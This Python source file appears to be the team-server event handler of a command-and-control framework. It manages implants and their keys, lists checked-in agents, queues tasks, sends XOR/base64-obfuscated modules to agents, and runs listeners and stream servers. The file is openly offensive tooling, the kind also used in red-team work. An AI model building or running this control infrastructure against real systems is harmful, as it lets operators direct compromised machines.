import hashlib
import os

from connect.convert import xor_base64
from connect.server.models import AgentModel, ImplantModel, TaskModel, get_session
from connect.stream.manager import StreamServerManager
from connect.server.tasks import TaskManager
from connect.listener.manager import ListenerManager


class TeamServerEvents:

    def __init__(self, app, key, sio_server):
        self.app = app
        self.key = key
        self.sio_server = sio_server
        self.sio_server.on('agent', self.agent)
        self.sio_server.on('connect', self.connect)
        self.sio_server.on('implant', self.implant)
        self.sio_server.on('task', self.task)
        self.sio_server.on('listener', self.listener)
        self.sio_server.on('streamer', self.streamer)
        self.stream_server_manager = StreamServerManager(self.sio_server)
        self.task_manger = TaskManager(self.sio_server)
        self.listener_manager = ListenerManager()

    async def connect(self, sid, environ, auth: str = 'no key provided'):
        if auth != self.key:
            await self.sio_server.disconnect(sid)
            return

    async def agent(self, sid, data):
        list_agent = data.get('list', None)
        with get_session() as session:
            if list_agent:
                seconds = int(list_agent.get('seconds'))
                agents = [agent.get_agent() for agent in session.query(AgentModel).all() if
                          0 <= agent.get_delta_seconds() <= seconds]
                if not agents:
                    await self.sio_server.emit('information', 'There are no agents')
                    return
                await self.sio_server.emit('agents', agents)
                return

            await self.sio_server.emit('information', f'Agent event hit with the following data: {data}')

    async def implant(self, sid, data):
        create_implant = 'create' in data.keys()
        list_implant = 'list' in data.keys()
        with get_session() as session:
            if create_implant:
                new_implant = ImplantModel()
                session.add(new_implant)
                session.commit()
                await self.sio_server.emit('success', f'Implant {new_implant.id} created their key is: {new_implant.key}')
                return

            if list_implant:
                implants = [implant.get_implant() for implant in session.query(ImplantModel).all()]
                if not implants:
                    await self.sio_server.emit('information', 'There are no implants')
                    return
                await self.sio_server.emit('implants', implants)
                return

            await self.sio_server.emit('information', f'Implant event hit with the following data: {data}')

    async def task(self, sid, data):
        create_task = data.get('create', None)
        with get_session() as session:
            if create_task:
                agent = session.query(AgentModel).filter_by(
                    id=create_task['agent']).first()  # ToDo: Error handling on agents that don't exist
                if not agent:
                    await self.sio_server.emit('error', f'Agent `{create_task["agent"]}` does not exist.')
                    return

                parameters = ','.join(parameter for parameter in create_task.get('parameters', []))  # ToDo: If parameters are provided that are not a list then break
                misc = ','.join(parameter for parameter in create_task.get('misc', []))  # ToDo: If misc is provided that is not a list then break
                module = create_task.get('module', None)

                if not await self.load_module(agent, module, session):
                    return

                new_task = TaskModel(agent=agent, method=create_task['method'], type=create_task['type'], parameters=parameters, misc=misc)
                session.add(new_task)
                await self.sio_server.emit('information', f'Scheduled task for method: `{new_task.method}`')
                return

        await self.sio_server.emit('information', f'Task event hit with the following data: {data}')

    async def load_module(self, agent, module, session):
        if not module:
            return True
        if not os.path.exists(module):
            await self.sio_server.emit('error', f'Module {module} does not exist.')
            return False
        module_bytes = open(module, 'rb').read()
        module_md5 = hashlib.md5(module_bytes).hexdigest()
        if module_md5 in agent.loaded_modules:
            return True
        module, key = xor_base64(module_bytes)
        parameters = ','.join([module, key])
        new_task = TaskModel(agent=agent, method='load', type=1, parameters=parameters, misc='')
        session.add(new_task)
        await self.sio_server.emit('information', f'Scheduled task for method: `{new_task.method}`')
        agent.loaded_modules = module_md5 if not agent.loaded_modules else ','.join(
            agent.loaded_modules) + f',{module_md5}'
        session.add(agent)
        return True

    async def listener(self, sid, data):
        create_listener = data.get('create', None)
        stop_listener = data.get('stop', None)
        list_listener = 'list' in data.keys()

        if create_listener:
            await self.listener_manager.create_listener(create_listener['ip'], create_listener['port'], self.task_manger, self.sio_server, self.stream_server_manager)
            return

        if stop_listener:
            await self.listener_manager.stop_listener(stop_listener['ip'], stop_listener['port'], self.sio_server)
            return

        if list_listener:
            listeners = self.listener_manager.get_listeners()
            if not listeners:
                await self.sio_server.emit('information', 'There are no listeners')
                return
            await self.sio_server.emit('listeners', listeners)
            return

        await self.sio_server.emit('information', f'Listener event hit with the following data: {data}')

    async def streamer(self, sid, data):
        create_streamer = data.get('create', None)
        list_streamers = 'list' in data.keys()

        if create_streamer:
            agent_id = create_streamer['agent_id']
            stream_server_type = create_streamer['type']
            ip = create_streamer['ip']
            port = create_streamer['port']
            await self.stream_server_manager.create_stream_server(stream_server_type, agent_id, ip, port)
            return

        if list_streamers:
            streamers = self.stream_server_manager.get_streamers()
            if not streamers:
                await self.sio_server.emit('information', 'There are no streamers')
                return
            await self.sio_server.emit('streamers', streamers)
            return

        await self.sio_server.emit('information', f'Streamer event hit with the following data: {data}')